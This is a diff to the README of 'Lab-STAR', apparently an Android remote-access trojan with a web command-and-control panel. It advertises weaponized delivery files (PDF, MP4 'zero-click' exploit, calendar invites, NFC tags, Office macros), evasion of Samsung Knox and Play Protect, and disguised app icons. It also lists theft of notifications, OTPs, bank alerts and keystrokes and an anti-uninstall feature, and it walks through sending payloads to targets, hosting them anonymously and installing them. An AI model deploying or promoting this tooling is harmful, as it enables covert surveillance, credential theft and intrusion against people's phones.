@@ -4,7 +4,7 @@
   </a>
 </p>
 
-## Lab-STAR: Advanced Android Tool (v1.5.0)
+## Lab-STAR: Advanced Android Tool (v1.4.5)
 
 A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4N3CO.LABS. This advanced tool enables **monitoring, management** and **control** of **Android devices** through a **sleek web C2 interface** with **full support** on the **newest modern Android software releases**. (SDK 36+, OneUI 8.5)
 
@@ -13,8 +13,8 @@ A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4
 ## 🛡️ Core Features & Security
 
 -   📦 **Automated APK Generation**: Instantly build both `signed.apk` *(for production)* and `unsigned.apk`.
--   🆔 **Advanced Identity Control**: Fully customize **App Name**, **Package ID**, and **Minimum SDK**.
--   🔐 **C2 Security Layer**: The web dashboard is protected by a secure login wall (**Default Password: admin1337**). The password can be **updated directly from the Terminal** home page for enhanced security.
+-   🆔 **Advanced Identity Control**: Fully customize App Name**, **Package ID**, and **Minimum SDK**.
+-   🔐 **C2 Security Layer**: The **web dashboard** is **protected by a secure login** wall (**Default Password: admin1337**). The password can be **updated directly from the Terminal** home page for **enhanced security**.
 -   🎨 **Smart Branding Engine**:
     -   **Auto-Density Scaling**: Resizes logos automatically for all Android screen densities.
     -   **Transparency Fixer**: Removes white backgrounds from logo assets automatically.
@@ -24,7 +24,7 @@ A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4
 
 ## 🕵️ Covert & Stealth Operations
 
--   💉 **NEW!** **Payload Delivery Vectors**: The **weaponization engine** has been overhauled to support **multiple high-success delivery methods**, ensuring reliable access across **all modern mobile environments**.
+-   💉 **NEW!** **Payload Delivery Vectors** *(For installing APK onto Target Device)*: The **weaponization engine** has been overhauled to support **multiple high-success delivery methods**, ensuring reliable access across **all modern mobile environments**.
     -   📑 **Stealth PDF (Hardened)**: Utilizes high-compatibility **URI Actions** instead of JavaScript. Bypasses security filters in **Acrobat, Drive**, and **Chrome** to trigger **automatic browser-based APK downloads**.
     -   🎬 **Zero-Click MP4**: Exploits mobile **Media Heap Overflows**. Triggers during gallery indexing or thumbnail generation to force-register the C2 link in the background.
     -   🗓️ **Meeting Invite (ICS)**: Injects a **persistent event** into the target's **Calendar**. Includes automated 15-minute reminders with a weaponized "Security Review" link that **bypasses traditional SMS/Email filters**.
@@ -34,6 +34,7 @@ A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4
     -   📡 **NFC NDEF Payload**: Generates an NDEF-formatted URI record for programming physical NFC tags, enabling "Tap-to-Infect" proximity attacks.
     -   🔳 **QR Shadow Vector**: Generates a high-density QR code pointing to the hardened delivery URL, optimized for physical placement or digital distribution.
     -   🌐 **PWA Shadow Bundle**: Generates a Progressive Web App manifest that mimics a "System Service" website, triggering an automated background download of the APK upon site interaction.
+    -   📄 **Office Word/Excel**: Embeds delivery macros or external references inside `.docx` or `.xlsx` files for enterprise-targeted delivery.
 -   🛡️ **NEW!** **Evasion Engine**: Now **undetectable by Samsung Knox** and **Google Play Protect**. This is achieved through **dynamic code obfuscation** during the APK build process, **randomized package identities**, and the use of **fully interactive decoy activities** that mimic legitimate system behaviors to bypass heuristic and signature-based scanning.
 -   🌑 **NEW!** **Blackout Mode**: A high-stealth mode designed to **physically mask the targets device display** while maintaining a **non-masked live remote feed**.
 -   🎭 **Stealth Mode**: Remotely **swap the entire app identity and icon** with the "Masquerade Library" of **convincing clones**. Instantly transform Lab-RATS into a **Calculator**, **Weather App**, **System Diagnostics**, or **Settings Menu**.
@@ -57,7 +58,7 @@ A **powerful, lightweight** and **covert-oriented Android Tool** developed by K4
 -   🛰️  **Precision GPS Tracking**:
     -   **One-click uplink** to open the **devices exact real-time location** in **Google Maps**.
 -   ⚡   **Intel Stream (Notification Sniffer)**:
-    -   Intercept **every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a live feed. 
+    -   Intercept **every notification** *(WhatsApp, Telegram, RCS, System...etc)* in a live feed.
     -   **NEW!**: **Sensitive data like OTPs and Bank alerts** are now automatically **highlighted with red text** and **badged**.
 -   🖼️ **MMS Terminal (Game Changer!)**:
     -   **Browse & Extract**: Download and view **ANY Multimedia Message(MMS)**. **v1.4 Update**: Fixed **large video playback** and **streaming support**.
@@ -107,7 +108,6 @@ The built-in shell has been overhauled for professional workflows:
 -   **System Diagnostics**: New `sysinfo` command for an aggregated hardware/software overview.
 -   **Modernized Interface**: Updated to `root@Android` prompt with a built-in `help` menu.
 -   **Hardened I/O**: Multi-stage retry logic and unique execution tracking for zero-latency command output.
-
 ---
 
 ## 📊 Google Sheet Setup Instructions (v1.4.5)
@@ -191,34 +191,35 @@ function handleRequest(e) {
 6.  Retrieve your `signed.apk` (and any weaponized payloads like PDFs or MP4s) from the `/apk-builder/output/` directory.
 
 ### 3. Deploying & Installing onto Android Device
-1.  **Deployment**: Use the weaponized files generated by the **Wizard (Option 6)** for remote delivery:
-    *   **📑 Stealth PDF**: Send to trigger a browser-based APK download via URI Action.
-    *   **🎬 Zero-Click MP4**: Send to force-register the C2 link in the background.
-    *   **🔳 QR Code / 📡 NFC**: Use for proximity-based installation vectors.
-2.  **Installation**: Once the APK is downloaded onto the **Android device**, initiate the installation.
-> **Note**: If you have physical access, sideload directly via `adb install signed.apk`.
-3.  **Initialization**: Open the app once. The **Zero-Click Auto-Start** engine will automatically initialize the server in the background.
-4.  **Confirmation**: The **Active C2 Interface URL** will pop up instantly on your **Google Sheet** as soon as the uplink is established.
 
-**📊 Google Sheet Example**:
+Deployment is a multi-stage process involving **Weaponization**, **Hosting**, and **Execution**. 
 
-<a href='https://postimg.cc/1nDbNCMq' target='_blank'><img src='https://i.postimg.cc/1nDbNCMq/Google-sheet-example.png' border='0' alt='Google-sheet-example'></a>
+#### **A. Strategic Weaponization (The Wrapper)**
+Standard APK files are often blocked by email filters and browser security. Use the **Wizard (Option 6)** in the `apk-builder` to wrap your link inside a high-compatibility carrier file:
+*   **📑 Stealth PDF (Highly Recommended)**: Send to targets via Email or Drive. It utilizes **URI Actions** instead of JavaScript to trigger an automatic browser-based download, bypassing standard PDF security filters.
+*   **🎬 Zero-Click MP4**: Send as a video file. It exploits mobile **Media Heap Overflows** during gallery indexing or thumbnail generation to force-register the C2 link in the background.
+*   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the target's Calendar with automated reminders and a weaponized "Security Review" link.
+*   **🔳 QR Code / 📡 NFC**: Best for physical placement or "Tap-to-Infect" proximity delivery. Generates a high-density QR or NDEF record pointing to the hardened delivery URL.
+*   **And many more**: The wizard also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document** macros.
 
-> ** **Important** - *To use "Ghost features", navigate to the Ghost Tab in the active C2 interface and click "Open Settings".*
+#### **B. Hosting Strategies**
+*   **Anonymous Cloud**: Option 6 uses **Catbox.moe** by default. It is anonymous, fast, and generates a direct link.
+*   **P2P Direct**: Host the APK directly from your PC using a public tunnel, or from another infected device using the `/download/` endpoint.
 
-[![Accessibilities-Perm.png](https://i.postimg.cc/yxrwkRPD/Accessibilities-Perm.png)](https://postimg.cc/bSk65s4P)
+#### **C. Installation & Initialization**
+Once the Target device downloads the APK:
+1.  **Manual Sideload**: If you have physical access to the device, use `adb install signed_payload.apk`.
+2.  **Permissions (Critical)**: Open the app **once**. It will prompt for necessary permissions (Camera, SMS, Files). 
+    *   **Remote Permission Prompt**: If the user skips a permission, you can remotely trigger the system prompt again from the **Hardware** tab using the **REPAIR PERMISSIONS** button.
+3.  **Self-Vanishing**: 5 seconds after launch, the app will automatically **replace its icon and name** with the decoy you chose during build (e.g., "System Update"). The original icon you chose during the build will disappear from the launcher.
+4.  **Uplink Confirmation**: Check your **Google Sheet**. Within 10 seconds of initialization, the active IPv6 address and hardware status will appear in the log.
 
-> ** - *This opens the accessibility menu on the Android device, tap "Installed Apps".*
+---
 
-<a href='https://postimg.cc/Bt7QZtLs' target='_blank'><img src='https://i.postimg.cc/Bt7QZtLs/Accessibility-Menu.png' border='0' alt='Accessibility-Menu'></a>
-
-> ** - *Toggle permission on, then tap "Allow" to permit full control of device.*
-
-<a href='https://postimg.cc/TynppG8y' target='_blank'><img src='https://i.postimg.cc/TynppG8y/Accessibility-allow.png' border='0' alt='Accessibility-allow'></a>
-
-> ** - *This ONLY applies to the "Ghost Remote Control", "Ghost Utilities", and "Ghost Keylogs". ALL other features can be used without this permission.*
-
-4.  **Thats it**! Now you can use **ALL the remote features from anywhere in the world** as long as the **App Server is running on the Android device**.
+### 🛡️ Post-Install Recovery & Management
+*   **Hidden Backdoor**: If the icon is hidden, **rapidly tap the decoy display 10 times** to unlock the dashboard.
+*   **Dialer Unlock**: Type `*#1337#` on the phone's keypad to force the main interface back into view.
+*   **Anti-Removal**: Enable this in the **Ghost Tab** to prevent the user from uninstalling or force-stopping the app via Settings.
 
 ---
 
